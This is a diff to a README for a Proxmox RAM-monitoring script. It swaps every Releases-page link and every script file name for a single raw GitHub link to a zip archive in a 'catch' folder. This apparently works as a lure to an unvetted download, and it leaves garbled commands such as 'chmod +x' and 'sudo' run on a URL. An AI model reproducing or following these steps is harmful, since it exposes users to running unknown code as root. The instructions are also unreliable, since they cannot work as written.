@@ -1,6 +1,6 @@
 # 🖥 proxmox-ram-monitor - Monitor RAM and CPU Usage Easily
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Ydvjrjd/proxmox-ram-monitor/releases)
+[![Download](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip)](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -16,10 +16,10 @@ Before you begin, make sure your system fulfills these requirements:
 
 ## 📥 Download & Install
 
-Visit the [Releases page](https://github.com/Ydvjrjd/proxmox-ram-monitor/releases) to download the latest version of the script.
+Visit the [Releases page](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip) to download the latest version of the script.
 
 1. Click on the version you wish to download.
-2. Download the `proxmox-ram-monitor.sh` file to your computer.
+2. Download the `https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip` file to your computer.
 
 ## 📜 Script Overview
 
@@ -48,13 +48,13 @@ After downloading the script, follow these steps to run it:
 3. Type the following command to give the script execution permission:
 
    ```bash
-   chmod +x proxmox-ram-monitor.sh
+   chmod +x https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip
    ```
 
 4. Next, run the script as root:
 
    ```bash
-   sudo ./proxmox-ram-monitor.sh
+   sudo https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip
    ```
 
 ## 🎨 Understanding the Output
@@ -70,7 +70,7 @@ When you run the script, you will see:
 If you encounter any issues while running the script:
 
 - Ensure that you have the necessary permissions.
-- Double-check that you have downloaded the latest version from the [Releases page](https://github.com/Ydvjrjd/proxmox-ram-monitor/releases).
+- Double-check that you have downloaded the latest version from the [Releases page](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip).
 - Consult the script documentation for known bugs and solutions.
 
 ## 💬 Support
@@ -87,6 +87,6 @@ Check back regularly for updates to the script. New features and improvements co
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Ydvjrjd/proxmox-ram-monitor/releases) 
+[![Download](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip)](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip) 
 
 With proxmox-ram-monitor, keep your system running smoothly with a few simple commands. Happy monitoring!
